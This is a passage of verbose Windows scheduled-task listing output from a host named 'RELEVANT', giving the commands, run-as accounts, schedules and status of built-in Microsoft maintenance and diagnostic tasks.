Last Result:                          0
Author:                               N/A
Task To Run:                          %windir%\system32\devicecensus.exe 
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 96:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        One Time Only, Hourly 
Start Time:                           3:00:00 AM
Start Date:                           9/1/2008
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        24 Hour(s), 0 Minute(s)
Repeat: Until: Time:                  None
Repeat: Until: Duration:              Disabled
Repeat: Stop If Still Running:        Disabled

HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\Device Information\Device
Next Run Time:                        7/20/2021 4:05:10 AM
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        7/19/2021 6:16:59 AM
Last Result:                          0
Author:                               N/A
Task To Run:                          %windir%\system32\devicecensus.exe 
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 96:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        Undefined
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\Diagnosis
HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\Diagnosis\Scheduled
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               Microsoft Corporation
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              The Windows Scheduled Maintenance Task performs periodic maintenance of the computer system by fixing problems automatically or reporting them through Security and Maintenance.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          INTERACTIVE
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\DiskCleanup
HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\DiskCleanup\SilentCleanup
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        7/25/2020 2:03:54 PM
Last Result:                          -2147020576
Author:                               Microsoft Corporation
Task To Run:                          %windir%\system32\cleanmgr.exe /autoclean /d %systemdrive%
Start In:                             N/A
Comment:                              Maintenance task used by the system to launch a silent auto disk cleanup when running low on free disk space.
Scheduled Task State:                 Enabled
Idle Time:                            Only Start If Idle for  minutes, If Not Idle Retry For  minutes Stop the task if Idle State end
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          Users
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\DiskDiagnostic
HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\DiskDiagnostic\Microsoft-Windows-DiskDiagnosticDataCollector
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        7/19/2021 6:25:48 AM
Last Result:                          0
Author:                               Microsoft Corporation
Task To Run:                          %windir%\system32\rundll32.exe dfdts.dll,DfdGetDefaultPolicyAndSMART
Start In:                             N/A
Comment:                              The Windows Disk Diagnostic reports general disk and system information to Microsoft for users participating in the Customer Experience Program.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     No Start On Batteries
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\DiskDiagnostic\Microsoft-Windows-DiskDiagnosticResolver
Next Run Time:                        N/A
Status:                               Disabled
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               Microsoft Corporation
Task To Run:                          %windir%\system32\DFDWiz.exe 
Start In:                             N/A
Comment:                              The Microsoft-Windows-DiskDiagnosticResolver warns users about faults reported by hard disks that support the Self Monitoring and Reporting Technology (S.M.A.R.T.) standard. This task is triggered automatically by the Diagnostic Policy Service when a S.
Scheduled Task State:                 Disabled
Idle Time:                            Disabled
Power Management:                     
Run As User:                          Users
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At logon time
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\DiskFootprint
HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\DiskFootprint\Diagnostics
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        7/19/2021 6:25:50 AM
Last Result:                          1
Author:                               N/A
Task To Run:                          %windir%\system32\disksnapshot.exe -z
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Only Start If Idle for  minutes, If Not Idle Retry For  minutes Stop the task if Idle State end
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 01:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\DiskFootprint\StorageSense
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               N/A
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Only Start If Idle for  minutes, If Not Idle Retry For  minutes Stop the task if Idle State end
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          Users
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 01:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\EDP
HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\EDP\EDP App Launch Task
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               N/A
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode
Run As User:                          INTERACTIVE
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        Undefined
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\EDP\EDP Auth Task
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               N/A
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode
Run As User:                          INTERACTIVE
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        Undefined
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\ErrorDetails
HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\ErrorDetails\EnableErrorDetailsUpdate
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               $(@%SystemRoot%\system32\ErrorDetailsUpdate.dll,-600)
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              $(@%SystemRoot%\system32\ErrorDetailsUpdate.dll,-601)
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 00:01:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        Undefined
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\ErrorDetails\ErrorDetailsUpdate
Next Run Time:                        N/A
Status:                               Disabled
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               $(@%systemroot%\system32\ErrorDetailsUpdate.dll,-600)
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              $(@%SystemRoot%\system32\ErrorDetailsUpdate.dll,-601)
Scheduled Task State:                 Disabled
Idle Time:                            Only Start If Idle for  minutes, If Not Idle Retry For  minutes Stop the task if Idle State end
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          NETWORK SERVICE
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 00:05:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\License Manager
HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\License Manager\TempSignedLicenseExchange
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               Microsoft Corporation
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              Exchanges temporary preinstalled licenses for Windows Store licenses.
Scheduled Task State:                 Enabled
Idle Time:                            Only Start If Idle for  minutes, If Not Idle Retry For  minutes Stop the task if Idle State end
Power Management:                     
Run As User:                          INTERACTIVE
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\Live
INFO: There are no scheduled tasks presently available at your access level.

Folder: \Microsoft\Windows\Location
HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\Location\Notifications
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               N/A
Task To Run:                          %windir%\System32\LocationNotificationWindows.exe 
Start In:                             N/A
Comment:                              Location Notification
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     
Run As User:                          Authenticated Users
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: Disabled
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        Undefined
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\Location\WindowsActionDialog
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               N/A
Task To Run:                          %windir%\System32\WindowsActionDialog.exe 
Start In:                             N/A
Comment:                              Location Notification
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     
Run As User:                          Authenticated Users
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: Disabled
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        Undefined
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\Maintenance
HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\Maintenance\WinSAT
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               Microsoft
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              Measures a system's performance and capabilities
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          Administrators
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 00:30:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\Maps
HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\Maps\MapsToastTask
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               Microsoft Corporation
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              This task shows various Map related toasts
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     
Run As User:                          INTERACTIVE
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 00:00:05
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\Maps\MapsUpdateTask
Next Run Time:                        N/A
Status:                               Disabled
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               Microsoft Corporation
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              This task checks for updates to maps which you have downloaded for offline use. Disabling this task will prevent Windows from notifying you of updated maps.
Scheduled Task State:                 Disabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          NETWORK SERVICE
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 00:00:40
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        One Time Only, Hourly 
Start Time:                           12:00:00 AM
Start Date:                           10/21/2014
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        24 Hour(s), 0 Minute(s)
Repeat: Until: Time:                  None
Repeat: Until: Duration:              Disabled
Repeat: Stop If Still Running:        Disabled

Folder: \Microsoft\Windows\MemoryDiagnostic
HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\MemoryDiagnostic\ProcessMemoryDiagnosticEvents
Next Run Time:                        N/A
Status:                               Disabled
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               Microsoft Corporation
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              Schedules a memory diagnostic in response to system events.
Scheduled Task State:                 Disabled
Idle Time:                            Only Start If Idle for  minutes, If Not Idle Retry For  minutes Stop the task if Idle State end
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          Administrators
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 02:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        When an event occurs
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\MemoryDiagnostic\ProcessMemoryDiagnosticEvents
Next Run Time:                        N/A
Status:                               Disabled
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               Microsoft Corporation
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              Schedules a memory diagnostic in response to system events.
Scheduled Task State:                 Disabled
Idle Time:                            Only Start If Idle for  minutes, If Not Idle Retry For  minutes Stop the task if Idle State end
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          Administrators
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 02:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        When an event occurs
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\MemoryDiagnostic\ProcessMemoryDiagnosticEvents
Next Run Time:                        N/A
Status:                               Disabled
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               Microsoft Corporation
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              Schedules a memory diagnostic in response to system events.
Scheduled Task State:                 Disabled
Idle Time:                            Only Start If Idle for  minutes, If Not Idle Retry For  minutes Stop the task if Idle State end
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          Administrators
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 02:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        When an event occurs
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\MemoryDiagnostic\ProcessMemoryDiagnosticEvents
Next Run Time:                        N/A
Status:                               Disabled
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               Microsoft Corporation
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              Schedules a memory diagnostic in response to system events.
Scheduled Task State:                 Disabled
Idle Time:                            Only Start If Idle for  minutes, If Not Idle Retry For  minutes Stop the task if Idle State end
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          Administrators
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 02:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        When an event occurs
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\MemoryDiagnostic\RunFullMemoryDiagnostic
Next Run Time:                        N/A
Status:                               Disabled
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               Microsoft Corporation
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              Detects and mitigates problems in physical memory (RAM).
Scheduled Task State:                 Disabled
Idle Time:                            Only Start If Idle for  minutes, If Not Idle Retry For  minutes Stop the task if Idle State end
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          Administrators
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 02:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\Mobile Broadband Accounts
HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\Mobile Broadband Accounts\MNO Metadata Parser
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               Microsoft
Task To Run:                          %SystemRoot%\System32\MbaeParserTask.exe 
Start In:                             N/A
Comment:                              Mobile Broadband Account Experience Metadata Parser
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 00:03:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        When an event occurs
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\MUI
HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\MUI\LPRemove
Next Run Time:                        N/A
Status:                               Queued
Logon Mode:                           Interactive/Background
Last Run Time:                        7/19/2021 6:25:49 AM
Last Result:                          0
Author:                               Microsoft Corporation
Task To Run:                          %windir%\system32\lpremove.exe 
Start In:                             N/A
Comment:                              Launch language cleanup tool
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 09:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\Multimedia
HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\Multimedia\SystemSoundsService
Next Run Time:                        N/A
Status:                               Disabled
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               N/A
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              System Sounds User Mode Agent
Scheduled Task State:                 Disabled
Idle Time:                            Disabled
Power Management:                     
Run As User:                          Users
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: Disabled
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At logon time
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\NetTrace
HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\NetTrace\GatherNetworkInfo
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               Microsoft
Task To Run:                          %windir%\system32\gatherNetworkInfo.vbs 
Start In:                             $(Arg1)
Comment:                              Network information collector
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode
Run As User:                          Users
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\Offline Files
HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\Offline Files\Background Synchronization
Next Run Time:                        N/A
Status:                               Disabled
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               Microsoft Corporation
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              This task controls periodic background synchronization of Offline Files when the user is working in an offline mode.
Scheduled Task State:                 Disabled
Idle Time:                            Disabled
Power Management:                     
Run As User:                          Authenticated Users
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 24:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        One Time Only, Hourly 
Start Time:                           12:00:00 AM
Start Date:                           1/1/2008
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        2 Hour(s), 0 Minute(s)
Repeat: Until: Time:                  None
Repeat: Until: Duration:              Disabled
Repeat: Stop If Still Running:        Disabled

HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\Offline Files\Logon Synchronization
Next Run Time:                        N/A
Status:                               Disabled
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               Microsoft Corporation
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              This task initiates synchronization of Offline Files when a user logs onto the system.
Scheduled Task State:                 Disabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          Authenticated Users
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 24:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At logon time
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\PLA
HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\PLA\Server Manager Performance Monitor
Next Run Time:                        N/A
Status:                               Disabled
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               The major version number of the operating system.
Task To Run:                          %systemroot%\system32\rundll32.exe %systemroot%\system32\pla.dll,PlaHost "Server Manager Performance Monitor" "$(Arg0)"
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Disabled
Idle Time:                            Disabled
Power Management:                     
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: Disabled
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At system start up
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\Plug and Play
HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\Plug and Play\Device Install Group Policy
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               Microsoft Corporation
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              Device Installation Group Policy Change Handler
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 24:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        Undefined
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             RELEVANT
